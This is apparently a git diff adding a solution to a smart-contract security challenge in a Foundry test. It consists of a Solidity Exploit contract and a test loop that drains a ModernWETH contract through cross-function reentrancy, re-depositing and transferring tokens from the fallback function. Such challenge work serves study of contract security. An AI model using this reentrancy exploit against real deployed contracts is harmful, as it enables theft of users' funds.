@@ -39,14 +39,44 @@ contract Challenge2Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge2Test -vvvv //
         ////////////////////////////////////////////////////*/
+        
+        //here cross function reentrancy possible
+        // _burnAll doesn't check how much amount to be burn
+        //we will transfer token before _burnAll()
 
+        Exploit exploiter = new Exploit(modernWETH,whitehat);
+        modernWETH.deposit{value: 10 ether}();
+        while(modernWETH.balanceOf(whitehat)< 1010 ether){
+            modernWETH.transfer(address(exploiter), modernWETH.balanceOf(whitehat));
+            exploiter.attack();
+        }
 
-
-        //==================================================//
+        modernWETH.withdraw(1010 ether);
         vm.stopPrank();
 
         assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
         // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
         assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
+    }
+}
+
+contract Exploit {
+    ModernWETH public modernWETH;
+    address whitehat;
+    constructor (ModernWETH _targetContract, address _whitehat){
+        modernWETH = _targetContract;
+        whitehat = _whitehat;
+    }
+
+    function attack() external payable{
+        //we cannot use withdraw() as it call _burn()
+        //and in _burn() => require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
+        
+        modernWETH.withdrawAll();
+    }
+    fallback() external payable{
+        modernWETH.deposit{value: msg.value}();
+        modernWETH.transfer(whitehat, modernWETH.balanceOf(address(this)));
+        console.log("after---:",modernWETH.balanceOf(whitehat)/10**18);
     }
 }
